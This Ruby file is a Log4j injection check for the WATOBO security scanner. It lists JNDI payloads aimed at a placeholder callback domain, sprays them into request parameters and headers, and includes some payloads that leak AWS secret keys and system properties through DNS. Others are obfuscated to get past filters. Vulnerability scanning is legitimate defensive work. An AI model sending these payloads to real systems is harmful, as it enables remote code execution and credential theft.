# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Java


        class Log4j < Watobo::ActiveCheck

          threat = <<'EOF'
Log4j RCE
EOF

          measure = "All user input should be filtered and/or escaped using a method appropriate for the output context"

          @info.update(
              :check_name => 'Log4j', # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => AC_GROUP_JAVA,
              :description => "Check for every parameter if log4j is triggered.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0" # check version
          )

          @finding.update(
              :threat => threat, # thread of vulnerability, e.g. loss of information
              :class => "Log4j Injection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_HIGH,
              :measure => measure
          )

          def initialize(project, prefs = {})
            super(project, prefs)

            # ${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}${::-n}${::-d}${::-I}:${::-l}${::-d}${::-a}${::-p}://CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}://CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}ndi:rmi://CALLBACK_DOMAIN/PAYLOAD}
            # NOT WORKING EXAMPLES
            # ${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://CALLBACK_TOKEN.CALLBACK_DOMAIN/PAYLOAD}
            collection=<<'EOS'
${jndi:ldap://${lower:CALLBACK_TOKEN}.aws.${env:AWS_SESSION_TOKEN:-notoken}.${env:AWS_ACCESS_KEY_ID:-nokey}.${env:AWS_SECRET_ACCESS_KEY:-nosecret}.exploit.CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://${lower:CALLBACK_TOKEN}.user.name.${sys:user.name}.exploit.CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://${lower:CALLBACK_TOKEN}.java.version.${sys:java.version}.exploit.CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://${lower:CALLBACK_TOKEN}.os.name.${sys:os.name}.exploit.CALLBACK_DOMAIN/PAYLOAD}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${jndi${123%25ff:-}:ldap://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${${lower:${lower:jndi}}:${lower:rmi}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${${lower:jndi}:${lower:rmi}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${${lower:n}${lower:d}i:${lower:rmi}://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://${lower:CALLBACK_TOKEN}.evasion.CALLBACK_DOMAIN/PAYLOAD}
${jnd${123%25ff:-${123%25ff:-i:}}ldap://${lower:CALLBACK_TOKEN}.simple.CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://127.0.0.1#${lower:CALLBACK_TOKEN}.simple.CALLBACK_DOMAIN/PAYLOAD}
${jndi:rmi://${lower:CALLBACK_TOKEN}.simple.CALLBACK_DOMAIN}
EOS
            @injections = collection.split
          end


          def generateChecks(chat)
            #
            #  Check GET-Parameters
            #
            begin
              checkparams = chat.request.parameters
              header_params = Watobo::Resources::HTTP_HEADERS.select{|h| checkparams.select{|cp| cp.name == h}.empty? }
              checkparams.concat header_params.map{|hh| Watobo::HeaderParameter.new( name: hh, value:'')}
              checkparams.each do |testparm|

                # puts parm
                # puts "#{Module.nesting[0].name}: run check on chat-id (#{chat.id}) with parm (#{parm})"
                @injections.each do |check|

                  parm = testparm.copy
                  checker = proc {
                    test = chat.copyRequest

                    cbtkn = 'log4j' + SecureRandom.hex(3)
                    cbsrv = Watobo::Conf::Scanner.dns_sensor

                    value = check.gsub(/CALLBACK_DOMAIN/, cbsrv)
                    value.gsub!(/CALLBACK_TOKEN/,cbtkn)

                    if testparm.location.to_s =~ /(url|http_parm|body|cookie)/
                      parm.value = CGI::escape(value)
                    else
                      parm.value = value
                    end

                    # TODO: implement side-channel token check
                    #  e.g. globel "register" (token) and "check"
                    #   - limited lifetime
                    # 
                    test.set parm
                    print '->'
                    test_request, test_response = doRequest(test)
                    print '*'
                    [test_request, test_response]
                  }
                  yield checker
                end
              end
            rescue => bang
              puts "!!! #{self} !!!"
              puts bang
              puts bang.backtrace
            end

          end
        end

      end
    end
  end
end
